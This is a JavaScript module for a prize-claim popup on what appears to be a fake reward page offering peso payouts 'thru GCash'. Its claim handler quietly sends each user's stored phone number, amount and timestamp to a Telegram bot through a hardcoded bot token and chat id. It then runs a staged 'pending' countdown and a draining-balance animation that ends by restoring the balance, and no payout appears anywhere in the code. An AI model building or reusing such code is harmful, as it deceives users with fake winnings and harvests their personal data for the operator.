/**
 * Claim Popup Module - 3 Minutes Countdown with Decrement Balance
 */

let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180, // 3 minutes = 180 seconds
    isPending: false
};

// Show the claim popup
function showClaimPopup(amount) {
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    claimState.isPending = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    
    claimBtn.classList.remove('processing');
    claimBtn.innerHTML = 'CLAIM THRU GCASH';
    claimBtn.disabled = false;
    
    popup.style.display = 'flex';
}

function hideClaimPopup() {
    const popup = document.getElementById('claimPopup');
    popup.style.display = 'none';
}

// Show pending status in main game area
function showPendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) {
        pendingArea.style.display = 'block';
    }
    claimState.isPending = true;
}

function hidePendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) {
        pendingArea.style.display = 'none';
    }
    claimState.isPending = false;
}

// Update countdown display (MM:SS format)
function updateCountdownDisplay(seconds) {
    const timerSpan = document.getElementById('pendingCountdown');
    if (!timerSpan) return;
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

// Animate balance decreasing (decrement by 1 every 0.5 seconds)
function startBalanceDecrement(originalAmount, onComplete) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = originalAmount;
    const decrementStep = 1;
    const intervalTime = 500; // 0.5 seconds per decrement
    
    claimState.balanceDecrementInterval = setInterval(() => {
        if (current <= 0) {
            clearInterval(claimState.balanceDecrementInterval);
            claimState.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
            if (onComplete) onComplete();
        } else {
            current = Math.max(0, current - decrementStep);
            balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        }
    }, intervalTime);
}

// Stop balance decrement
function stopBalanceDecrement() {
    if (claimState.balanceDecrementInterval) {
        clearInterval(claimState.balanceDecrementInterval);
        claimState.balanceDecrementInterval = null;
    }
}

// Restore original balance
function restoreBalance(amount) {
    const balanceText = document.getElementById('balanceText');
    if (balanceText) {
        balanceText.innerText = "₱" + amount.toLocaleString() + ".00";
    }
    
    // Update Firebase balance
    if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
        window.parent.updateGameBalance(amount);
    } else if (typeof updateGameBalance === 'function') {
        updateGameBalance(amount);
    } else if (typeof GameState !== 'undefined') {
        GameState.balance = amount;
        if (typeof updateUI === 'function') updateUI();
        if (typeof saveData === 'function') saveData();
    }
}

// Start 3-minute countdown
function startCountdown(originalAmount, onComplete) {
    let remaining = claimState.countdownSeconds;
    updateCountdownDisplay(remaining);
    
    claimState.countdownInterval = setInterval(() => {
        remaining--;
        updateCountdownDisplay(remaining);
        
        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;
            
            // Stop balance decrement if still running
            stopBalanceDecrement();
            
            // Restore original balance
            restoreBalance(originalAmount);
            
            // Hide pending status
            hidePendingStatus();
            
            // Reset claim state
            claimState.isProcessing = false;
            claimState.isPending = false;
            
            // Show claim button again (if needed)
            const claimBtn = document.getElementById('claimActionBtn');
            if (claimBtn) {
                claimBtn.disabled = false;
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
            }
            
            // Show withdraw button in main game
            const withdrawBtn = document.getElementById('claimBtn');
            if (withdrawBtn) {
                withdrawBtn.style.display = 'block';
            }
            
            if (onComplete) onComplete();
        }
    }, 1000);
}

// Main claim action
function onClaimAction() {
    if (claimState.isProcessing) return;
    if (claimState.isPending) return;
    
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';
    
    const message = `💰 CLAIM REQUEST (PENDING)!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
        .catch(e => console.log('Telegram error:', e));
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                
                db.ref('links/' + key).update({ 
                    status: 'claimed', 
                    user: userPhone,
                    amount: amount,
                    claimedAt: Date.now()
                });
                
                // Close popup and show pending status
                hideClaimPopup();
                showPendingStatus();
                
                // Start balance decrement animation
                startBalanceDecrement(amount, null);
                
                // Start 3-minute countdown
                startCountdown(amount, null);
                
            } else {
                claimBtn.innerHTML = 'NO REWARDS';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimState.isProcessing = false;
                }, 3000);
                alert("Sorry! No available rewards at the moment.");
            }
        }).catch((error) => {
            console.error("Database error:", error);
            claimBtn.innerHTML = 'ERROR';
            setTimeout(() => {
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
                claimBtn.disabled = false;
                claimState.isProcessing = false;
            }, 3000);
            alert("Database error. Please try again.");
        });
    } else {
        alert("Firebase not initialized. Please refresh.");
        claimState.isProcessing = false;
        claimBtn.classList.remove('processing');
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
}

// Reset function (optional, for admin or debugging)
function resetClaimState() {
    if (claimState.countdownInterval) {
        clearInterval(claimState.countdownInterval);
        claimState.countdownInterval = null;
    }
    stopBalanceDecrement();
    hidePendingStatus();
    claimState.isProcessing = false;
    claimState.isPending = false;
}

document.addEventListener('DOMContentLoaded', function() {
    if (!document.getElementById('claimPopup')) {
        console.log('Popup container not found');
    }
    hidePendingStatus();
});
